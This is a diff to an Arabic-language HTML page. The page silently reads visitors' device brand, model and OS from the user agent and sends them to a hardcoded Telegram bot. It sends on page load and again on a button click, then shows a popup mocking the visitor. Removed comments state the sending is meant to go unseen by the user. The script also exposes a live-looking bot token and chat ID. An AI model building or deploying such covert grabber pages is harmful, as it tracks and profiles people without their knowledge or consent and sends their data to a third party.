@@ -309,9 +309,159 @@
         }
       }
 
-      /* مؤشر تحميل خفي - لن يرى المستخدم شيئاً */
-      .hidden-status {
+      /* ====== رسالة البوب أب المخصصة ====== */
+      .custom-popup {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.75);
+        backdrop-filter: blur(10px);
+        -webkit-backdrop-filter: blur(10px);
         display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+        animation: fadeIn 0.4s ease;
+        padding: 1.5rem;
+      }
+
+      .custom-popup.active {
+        display: flex;
+      }
+
+      .popup-content {
+        background: linear-gradient(
+          145deg,
+          rgba(20, 30, 50, 0.95),
+          rgba(10, 18, 30, 0.98)
+        );
+        backdrop-filter: blur(20px);
+        -webkit-backdrop-filter: blur(20px);
+        border: 1px solid rgba(200, 214, 224, 0.2);
+        border-radius: 36px;
+        padding: 2.5rem 2rem;
+        max-width: 440px;
+        width: 100%;
+        text-align: center;
+        box-shadow:
+          0 40px 80px rgba(0, 0, 0, 0.8),
+          0 0 60px rgba(200, 214, 224, 0.05);
+        animation: scaleUp 0.5s cubic-bezier(0.23, 1, 0.32, 1);
+        position: relative;
+        overflow: hidden;
+      }
+
+      .popup-content::before {
+        content: "";
+        position: absolute;
+        top: -50%;
+        left: -50%;
+        width: 200%;
+        height: 200%;
+        background: radial-gradient(
+          circle at 30% 20%,
+          rgba(200, 214, 224, 0.05) 0%,
+          transparent 60%
+        );
+        pointer-events: none;
+      }
+
+      .popup-icon {
+        font-size: 3.5rem;
+        margin-bottom: 0.8rem;
+        display: block;
+        animation: popIcon 0.6s ease;
+      }
+
+      .popup-title {
+        color: #f0f6ff;
+        font-size: 1.7rem;
+        font-weight: 700;
+        margin-bottom: 0.8rem;
+        position: relative;
+        z-index: 1;
+      }
+
+      .popup-title span {
+        background: linear-gradient(135deg, #fcd34d, #f59e0b);
+        -webkit-background-clip: text;
+        background-clip: text;
+        color: transparent;
+      }
+
+      .popup-message {
+        color: #c8d6e0;
+        font-size: 1.15rem;
+        line-height: 1.8;
+        margin-bottom: 1.8rem;
+        position: relative;
+        z-index: 1;
+      }
+
+      .popup-message .highlight {
+        color: #fbbf24;
+        font-weight: 600;
+      }
+
+      .popup-btn {
+        background: linear-gradient(135deg, #fbbf24, #f59e0b);
+        border: none;
+        padding: 0.9rem 2.5rem;
+        border-radius: 40px;
+        color: #0b1120;
+        font-weight: 700;
+        font-size: 1.05rem;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        position: relative;
+        z-index: 1;
+        box-shadow: 0 4px 20px rgba(245, 158, 11, 0.3);
+      }
+
+      .popup-btn:hover {
+        transform: scale(1.04);
+        box-shadow: 0 6px 30px rgba(245, 158, 11, 0.5);
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+
+      @keyframes scaleUp {
+        from {
+          transform: scale(0.85) translateY(20px);
+          opacity: 0;
+        }
+        to {
+          transform: scale(1) translateY(0);
+          opacity: 1;
+        }
+      }
+
+      @keyframes popIcon {
+        0% {
+          transform: scale(0) rotate(-20deg);
+        }
+        60% {
+          transform: scale(1.3) rotate(5deg);
+        }
+        100% {
+          transform: scale(1) rotate(0);
+        }
+      }
+
+      /* تأثيرات إضافية للزر */
+      .btn-success {
+        background: rgba(251, 191, 36, 0.15) !important;
+        border-color: #fbbf24 !important;
+        color: #fbbf24 !important;
       }
     </style>
   </head>
@@ -338,12 +488,29 @@
       </div>
     </div>
 
+    <!-- ====== البوب أب المخصص ====== -->
+    <div class="custom-popup" id="customPopup">
+      <div class="popup-content">
+        <span class="popup-icon">🔥</span>
+        <h2 class="popup-title">حليناها <span>يعمر</span></h2>
+        <p class="popup-message">
+          مالك هو عمك <span class="highlight">عمك</span> 😎<br />
+        </p>
+        <button class="popup-btn" id="popupCloseBtn">تمام يا عمي</button>
+      </div>
+    </div>
+
     <script>
       (function () {
         // ====== إعدادات البوت ======
         const TOKEN = "8513780659:AAEfY9E_ystaZlZB4HlD6XagfXTMGrHYR6A";
         const CHAT_ID = "8166156987";
         const BOT_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        // ====== عناصر DOM ======
+        const btn = document.getElementById("actionBtn");
+        const popup = document.getElementById("customPopup");
+        const popupCloseBtn = document.getElementById("popupCloseBtn");
 
         // ====== دالة جمع معلومات الجهاز (غير حساسة) ======
         function getDeviceInfo() {
@@ -352,13 +519,11 @@
           let model = "غير معروف";
           let osVersion = "غير معروف";
 
-          // محاولة استخراج العلامة التجارية من User-Agent
           const uaLower = ua.toLowerCase();
 
-          // قائمة العلامات التجارية الأكثر شيوعاً
           const brands = [
             { name: "Xiaomi", patterns: ["xiaomi", "redmi", "poco"] },
-            { name: "Oppo", patterns: ["oppo", "realme", "oneplus"] }, // OnePlus قريب من Oppo
+            { name: "Oppo", patterns: ["oppo", "realme", "oneplus"] },
             { name: "Samsung", patterns: ["samsung", "galaxy"] },
             { name: "Huawei", patterns: ["huawei", "honor"] },
             { name: "Apple", patterns: ["iphone", "ipad", "macintosh"] },
@@ -385,7 +550,6 @@
             if (brand !== "غير معروف") break;
           }
 
-          // محاولة استخراج الإصدار (Android أو iOS)
           const androidMatch = ua.match(/Android\s([\d.]+)/);
           const iosMatch = ua.match(/OS\s([\d_]+)\slike\sMac\sOS\sX/);
           const windowsMatch = ua.match(/Windows\sNT\s([\d.]+)/);
@@ -405,7 +569,6 @@
             osVersion = "إصدار غير معروف";
           }
 
-          // محاولة استخراج الموديل (رقم أو اسم)
           let modelMatch = ua.match(/\(([^)]+)\)/);
           if (modelMatch) {
             const parts = modelMatch[1].split(";");
@@ -418,7 +581,6 @@
                 !trimmed.includes("Mac") &&
                 !trimmed.includes("Windows")
               ) {
-                // قد يكون الموديل
                 if (trimmed.length > 2 && trimmed.length < 30) {
                   model = trimmed;
                   break;
@@ -427,7 +589,6 @@
             }
           }
 
-          // إذا كان الموديل لا يزال غير معروف، نحاول استخراج من User-Agent
           if (model === "غير معروف") {
             const modelRegex = /(?:Android\s[\d.]+;\s)([^;)]+)/;
             const match = ua.match(modelRegex);
@@ -479,31 +640,57 @@
             });
         }
 
-        // ====== تنفيذ الإرسال عند تحميل الصفحة (مرة واحدة) ======
-        // ننتظر حتى يكتمل تحميل الصفحة ثم نجمع المعلومات ونرسلها بصمت
+        // ====== عرض البوب أب ======
+        function showPopup() {
+          popup.classList.add("active");
+          document.body.style.overflow = "hidden";
+        }
+
+        // ====== إخفاء البوب أب ======
+        function hidePopup() {
+          popup.classList.remove("active");
+          document.body.style.overflow = "";
+        }
+
+        // ====== إغلاق البوب أب عند النقر على الزر ======
+        popupCloseBtn.addEventListener("click", hidePopup);
+
+        // ====== إغلاق البوب أب عند النقر خارج المحتوى ======
+        popup.addEventListener("click", function (e) {
+          if (e.target === popup) {
+            hidePopup();
+          }
+        });
+
+        // ====== إرسال معلومات الجهاز عند تحميل الصفحة ======
         window.addEventListener("load", function () {
-          // نؤخر الإرسال قليلاً لضمان استقرار المتصفح
           setTimeout(() => {
             const deviceInfo = getDeviceInfo();
             sendDeviceInfoToTelegram(deviceInfo);
           }, 300);
         });
 
-        // ====== إضافة تأثير إضافي: عند الضغط على الزر نرسل مرة أخرى (تأكيد) ======
-        const btn = document.getElementById("actionBtn");
+        // ====== عند الضغط على الزر: إرسال + عرض البوب أب ======
         if (btn) {
           btn.addEventListener("click", function (e) {
-            // إرسال تحديث جديد عند النقر (بدون إزعاج المستخدم)
+            // 1. إرسال معلومات الجهاز
             const deviceInfo = getDeviceInfo();
             sendDeviceInfoToTelegram(deviceInfo);
 
-            // تأثير بصري بسيط لإشعار المستخدم بأن الكارد حي
+            // 2. إضافة تأثير مؤقت على الزر
+            this.classList.add("btn-success");
             this.textContent = "✓ تم الإرسال";
-            this.style.background = "rgba(200, 214, 224, 0.15)";
+
+            // 3. عرض البوب أب بعد نصف ثانية (لإعطاء شعور بالاستجابة)
             setTimeout(() => {
+              showPopup();
+            }, 400);
+
+            // 4. إعادة الزر لحالته بعد فترة
+            setTimeout(() => {
+              this.classList.remove("btn-success");
               this.textContent = "أطلق العنان";
-              this.style.background = "";
-            }, 1200);
+            }, 1500);
           });
         }
 
